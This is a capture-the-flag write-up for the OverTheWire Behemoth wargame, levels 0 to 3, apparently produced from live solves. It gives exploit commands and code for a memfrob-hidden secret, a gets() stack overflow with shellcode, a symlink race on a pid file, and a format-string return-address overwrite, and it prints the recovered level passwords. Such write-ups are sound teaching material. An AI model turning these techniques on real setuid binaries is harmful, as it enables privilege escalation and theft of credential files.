# OverTheWire Behemoth — Solutions

Live solves against `behemoth.labs.overthewire.org:2221` in this run. Behemoth is
a setuid binary-exploitation wargame; sources are not provided, so every level is
solved by reading the binaries (`strings`, `objdump`, `gdb`, `nm`, `readelf`).
For each level: goal, technique and why it works, exact commands, verification.
Recordings in `recordings/behemoth/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → behemoth1
- **Account:** `behemoth0`, password `behemoth0` (given by the game).
- **Goal:** `main` builds a secret on the stack, memfrobs it, reads up to 64
  characters into another stack buffer, and `strcmp`s the two. On a match it
  prints "Access granted..", does `setreuid(geteuid(),geteuid())` and runs
  `system("/bin/sh")`.
- **Technique and why it works:** the secret is stored in plain sight as
  immediates in the disassembly, but obfuscated with glibc's `memfrob`, which
  XORs every byte with 42 (`0x2A`). We read the three `movl` immediates that
  initialise the secret and XOR them with 42 to recover the plaintext password.
  Nothing has to be guessed or brute-forced: the comparison string is fully
  recoverable from the binary.

### Step-by-step discovery and crafting (what the recording shows)
1. **List the game and the binaries.** `ls -la /behemoth/` shows `behemoth0`
   is setuid `behemoth1`, and each later binary is setuid to the next user.
2. **Look at the strings.** `strings -a /behemoth/behemoth0` shows the program
   text plus three suspicious blobs — `OK^G`, `SYBE`, `X^Y` — and the symbol
   `memfrob`. Those are not random: they are ASCII XOR-ed with 42.
3. **Read the disassembly of `main`.**
   ```
   objdump -d --no-show-raw-insn /behemoth/behemoth0 | sed -n '/<main>:/,/strcmp/p'
   ```
   The secret is built from three immediates at `-0x55(%ebp)`:
   ```
   movl $0x475e4b4f,-0x55(%ebp)   # 4f 4b 5e 47  = "OK^G"
   movl $0x45425953,-0x51(%ebp)   # 53 59 42 45  = "SYBE"
   movl $0x00595e58,-0x4d(%ebp)   # 58 5e 59 00  = "X^Y\0"
   ```
   so the stored string is `OK^GSYBEX^Y` (little-endian byte order within each
   dword). Then the program calls `memfrob(secret, strlen(secret))` and
   `strcmp(secret, input)`.
4. **Decode the secret.** `memfrob` XORs each byte with 42:
   ```
   python3 -c 'print(bytes(c ^ 42 for c in bytes.fromhex("4f4b5e4753594245585e59")))'
   # b'eatmyshorts'
   ```
5. **Feed the password.** The binary reads our input with `scanf("%64s")` and,
   on success, runs `system("/bin/sh")`. Because the shell inherits the same
   stdin, we send the password first and then the commands after a short delay
   (so `scanf` does not consume them):
   ```
   { printf "eatmyshorts\n"; sleep 1; printf "id\ncat /etc/behemoth_pass/behemoth1\nexit\n"; } | /behemoth/behemoth0
   # Password: Access granted..
   # uid=13001(behemoth1) ...
   # paAotdjMCj
   ```
- **Password for behemoth1:** `paAotdjMCj`
- **Verification:** logged in as `behemoth1` with this password (`whoami` → `behemoth1`).
- **Recording:** `recordings/behemoth/L0.cast`

## Level 1 → behemoth2
- **Account:** `behemoth1`, password `paAotdjMCj`.
- **Goal:** `main` declares `char buf[67]` (at `ebp-0x43`), calls `gets(buf)`, then `puts(...)` and returns. There is no length check.
- **Technique and why it works:** `gets()` reads until a newline with no bound, so a 71-byte input overwrites the saved EBP and the return address (offset 71). The stack is executable (`GNU_STACK RWE`) and ASLR is off (`randomize_va_space` = 0), so the simplest and most reliable exploit is **stack shellcode**: put null-free shellcode on the stack just after the return address and return into it. The shellcode writes a `PWN!` marker (so the sweep can tell a hit from a crash), then does `geteuid`, `setreuid(euid,euid)`, `setuid(euid)` and `execve("/bin/sh")` — the `setuid` keeps the effective UID over the `execve`, exactly as in the Narnia levels.

### Step-by-step discovery and crafting (what the recording shows)
1. **Check the binary and protections.**
   ```
   file /behemoth/behemoth1                 # setuid ELF 32-bit i386
   readelf -lW /behemoth/behemoth1 | grep GNU_STACK   # RWE (executable stack)
   cat /proc/sys/kernel/randomize_va_space  # 0 (no ASLR)
   ```
2. **Disassemble `main`.**
   ```
   objdump -d --no-show-raw-insn /behemoth/behemoth1 | sed -n '/<main>:/,/ret/p'
   # lea -0x43(%ebp),%eax ; push %eax ; call gets@plt
   ```
   `buf` is at `ebp-0x43`, so the saved EBP is at offset 67 and the return
   address at offset **71**.
3. **Confirm in gdb.**
   ```
   gdb -batch -ex 'b *0x80491a2' -ex 'run AAAA' -ex 'p/x $ebp-0x43' -ex 'p/x $ebp+4' /behemoth/behemoth1
   # $1 = 0xffffdb95 (buf)   $2 = 0xffffdbdc (return address)
   ```
4. **Write the shellcode in `vim /tmp/b1.asm`** (marker write, `geteuid`,
   `setreuid(euid,euid)`, `setuid(euid)`, `execve("/bin/sh")`), then:
   ```
   nasm -f elf32 /tmp/b1.asm -o /tmp/b1.o
   objdump -d -M intel /tmp/b1.o
   objcopy -O binary --only-section=.text /tmp/b1.o /tmp/b1.bin
   xxd -p /tmp/b1.bin ; wc -c /tmp/b1.bin     # 78 bytes
   ```
5. **Build the payload and sweep.** `payload = b"\x90"*71 + pack("<I", addr) + sc + b"\n"`.
   The exploit forks one child per candidate return address in
   `0xffffd000..0xffffe800`, feeds the payload on stdin, and watches for `PWN!`.
   On a hit it re-runs the binary with the found address and feeds the shell
   commands (`id`, `cat /etc/behemoth_pass/behemoth2`). The sweep landed at
   **0xffffde20**.
6. **Use the shell.**
   ```
   id                        # uid=13002(behemoth2) gid=13001(behemoth1)
   cat /etc/behemoth_pass/behemoth2
   ```
- **Password for behemoth2:** `T27XOH3cbn`
- **Verification:** logged in as `behemoth2` with this password (`whoami` → `behemoth2`).
- **Recording:** `recordings/behemoth/L1.cast`

## Level 2 → behemoth3
- **Account:** `behemoth2`, password `T27XOH3cbn`.
- **Goal:** No source is shipped for behemoth2, so the behaviour is recovered from `objdump`. In order:
  ```c
  sprintf(buf, "touch %d", getpid());      // buf is a local array
  lstat(buf); unlink(buf);                 // remove a stale file with that name
  setreuid(euid, euid); system(buf);       // touch <pid> in the CURRENT directory
  sleep(2000);
  sprintf(buf, "cat "); buf[4] = ' '; system(buf);   // cat <pid>, still as behemoth3
  ```
  The second `system()` runs after `setreuid`, so it executes as behemoth3 — and the file it cats is the one in the current directory, which we can change.
- **Technique and why it works:** **pid-file race / symlink swap**. The program touches a file named after its own pid in the directory it was started from. If we start it inside a directory we own and watch for the numeric file to appear, we can `unlink` it and replace it with a symlink to `/etc/behemoth_pass/behemoth3`. When the program wakes after its 2000-second sleep and runs `cat <pid>` as behemoth3, the symlink resolves to the password file and the contents are printed to stdout.

  The practical wrinkle is the wait: 2000 seconds is about 33 minutes, and the lab drops idle SSH sessions. The exploit therefore prints a heartbeat every 30 seconds so the session stays alive, and the recorder's wait budget is set accordingly.

### Step-by-step discovery and crafting (what the recording shows)
1. **Recover the logic.** `strings` shows `touch %d` and `cat `; `objdump -d` shows `sprintf`, `lstat`, `unlink`, `setreuid(euid,euid)`, `system`, `sleep(0x7d0)`, then `sprintf(buf,"cat ")` with `buf[4]=' '` and another `system`.
2. **Check the environment.** The home directory is not writable, and `/tmp` is sticky, so a file owned by behemoth3 cannot be unlinked there — hence a dedicated `/tmp/b2work` created and made world-writable.
3. **Write the exploit in `vim /tmp/e_behemoth2.py`** (shown in full in the recording):
   ```python
   work = "/tmp/b2work"; os.makedirs(work, exist_ok=True); os.chmod(work, 0o777)
   os.chdir(work)
   p = subprocess.Popen(["/behemoth/behemoth2"])
   # wait for the numeric pid file, then swap it for a symlink
   os.unlink(target); os.symlink("/etc/behemoth_pass/behemoth3", target)
   while p.poll() is None:          # heartbeat keeps ssh alive during sleep(2000)
       print("alive", int(time.time()), flush=True); time.sleep(30)
   ```
4. **Run it.** The recording shows `pid: 74`, `pidfile: 74`, `replaced 74 -> /etc/behemoth_pass/behemoth3`, then ~33 minutes of `alive` lines, and finally `3gr7EdpaSr` and `B2DONE`.
5. **Verify.** Log in as behemoth3 with that password (`whoami` → `behemoth3`).
- **Password for behemoth3:** `3gr7EdpaSr`
- **Verification:** logged in as `behemoth3` with this password.
- **Recording:** `recordings/behemoth/L2.cast`

## Level 3 → behemoth4
- **Account:** `behemoth3`, password `3gr7EdpaSr`.
- **Goal:** The binary asks "Identify yourself", reads up to 200 bytes with `fgets(buf, 0xc8, stdin)`, then does `printf(buf)` — the buffer is used as the format string.
- **Technique and why it works:** **format-string arbitrary write**. `printf(buf)` with attacker-controlled text lets us use `%n`/`%hn` to write a value to an address we choose. The addresses are supplied through the varargs: on i386 the arguments are read from the stack above the call, and here the stack happens to hold *the buffer itself*, so argument *k* is the dword at `buf + 4*(k-1)`. That is confirmed in the recording: `printf '%1$p|%2$p|%3$p'` prints the first three dwords of the buffer.

  The plan:
  1. Leak `argv[0]` with `%54$p`; with an empty environment `buf = argv[0] - 0x194`, verified by printing `%41$s` after placing that address at `buf+160`.
  2. The saved return address lives at `buf+204` (buf is at `ebp-0xc8`, saved ebp at +200). Put `buf+204` and `buf+206` at `buf+160`/`buf+164` — those become varargs 41 and 42.
  3. Write the shellcode's address with `%<low>c%41$hn%<high-low>c%42$hn`. The crucial subtlety: `%hn` writes the **total** number of characters printed so far, not just the width of the current conversion, so the first width is the low half and the second is the difference to the high half (mod 65536).
  4. The format string's own length determines where the shellcode starts, so the address is computed by iterating to a fixed point.

  The shellcode (written in `vim /tmp/b3.asm`, assembled with `nasm -f elf32`, extracted with `objcopy -O binary --only-section=.text`, dumped with `xxd`) prints `PWN!`, then `geteuid(); setreuid(euid,euid); setuid(euid)` so the behemoth4 euid survives `execve`, then `execve("/bin/sh")`. It contains no NUL (fgets would stop) and no `%` (printf would consume it) — both asserted in the exploit.

  The exploit runs behemoth3 on a **raw-mode pty**: the payload is binary and a canonical terminal would eat bytes such as `0x04` (EOF) or `0x03` (SIGINT). It then feeds `id` and `cat /etc/behemoth_pass/behemoth4` to the shell it spawned.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the code.** `strings`/`objdump -d` show `fgets(buf,0xc8,stdin)` then `printf(buf)`; `objdump -R` shows `printf@0x804b230`, `fgets@0x804b234`, `puts@0x804b238` (no RELRO), but we do not need the GOT — we target the saved return address.
2. **gdb** gives `$ebp-0xc8` and `$ebp+4`, confirming buf/saved-ebp/ret offsets 0/200/204.
3. **Probe the varargs.** `printf '%p %p %p %p %p %p'` shows stack words, and `%1$p|%2$p|%3$p` shows the buffer's first dwords — the varargs *are* the buffer.
4. **Write the shellcode in vim**, `nasm`, `objdump -d -M intel`, `objcopy`, `xxd -p`, `wc -c` → 78 bytes.
5. **Write the exploit in vim**: leak `argv[0]` (`%54$p`), derive `buf`, verify with `%41$s`, compute the two writes, build `fmt + sc + padding + [ret_slot, ret_slot+2]`, and drive a raw pty.
6. **Run it.** The recording shows the leak, the format string `%56681c%41$hn%8854c%42$hn`, `PWN!`, `uid=13004(behemoth4)`, and `ABTmcqez7l`.
7. **Verify.** Log in as behemoth4 (`whoami` → `behemoth4`).
- **Password for behemoth4:** `ABTmcqez7l`
- **Verification:** logged in as `behemoth4` with this password.
- **Recording:** `recordings/behemoth/L3.cast`
